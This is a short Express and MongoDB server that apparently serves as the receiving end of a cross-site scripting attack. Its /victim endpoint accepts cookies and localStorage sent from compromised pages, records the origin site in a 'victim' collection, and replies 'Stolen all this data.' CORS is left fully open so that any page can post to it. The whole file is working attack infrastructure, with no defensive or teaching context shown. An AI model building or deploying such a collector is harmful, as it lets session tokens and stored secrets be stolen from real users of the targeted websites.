import express from "express";
import mongoose from "mongoose";
import cors from "cors";

const app = express();

app.use(cors());
app.use(express.json());

await mongoose.connect("mongodb://127.0.0.1:27017/xss_attacks",
  { useNewUrlParser: true, useUnifiedTopology: true }
).then(() => console.log("Connected to MongoDB")).catch((err) => console.log(err));

const victimSchema = new mongoose.Schema({
  cookies: {},
  localStorage: {},
  website: String,
});

const Victim = mongoose.model("victim", victimSchema);

app.use(express.static("./public"));

app.post("/victim", async (req, res) => {
  const { cookies, localStorage } = req.body
  const victim = await Victim.create({
    localStorage: localStorage,
    cookies: cookies,
    website: req.headers.origin,
  });
  return res
    .status(201)
    .json({ message: "Stolen all this data.", data: victim });
});

// Start server
app.listen(8000, () => console.log("Server running on http://localhost:8000"));


